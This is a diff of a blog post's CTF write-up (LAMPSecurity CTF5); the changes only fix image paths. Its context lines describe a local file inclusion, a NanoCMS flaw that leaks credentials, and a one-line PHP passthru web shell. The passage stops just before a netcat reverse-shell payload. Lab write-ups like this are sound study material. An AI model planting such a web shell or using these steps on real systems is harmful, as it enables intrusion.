@@ -52,23 +52,23 @@ Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php
 
 The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img1.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-20-lamp-security-ctf5-writeup/img1.png)
 
 Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img2.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-20-lamp-security-ctf5-writeup/img2.png)
 
 I found this [vulnerability](http://www.securityfocus.com/bid/34508) for NanoCMS (DirBuster found the same file):
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img3.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-20-lamp-security-ctf5-writeup/img3.png)
 
 Ok I got the username and password hash:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img4.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-20-lamp-security-ctf5-writeup/img4.png)
 
 Authentication was successful, I created a new page containing a classic “<?php passthru($_GET[“cmd”]); ?>”:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img5.png)
+![Screenshot]({{ site.baseurl }}/images/2016-12-20-lamp-security-ctf5-writeup/img5.png)
 
 I got a reverse shell on netcat by using this payload:
 
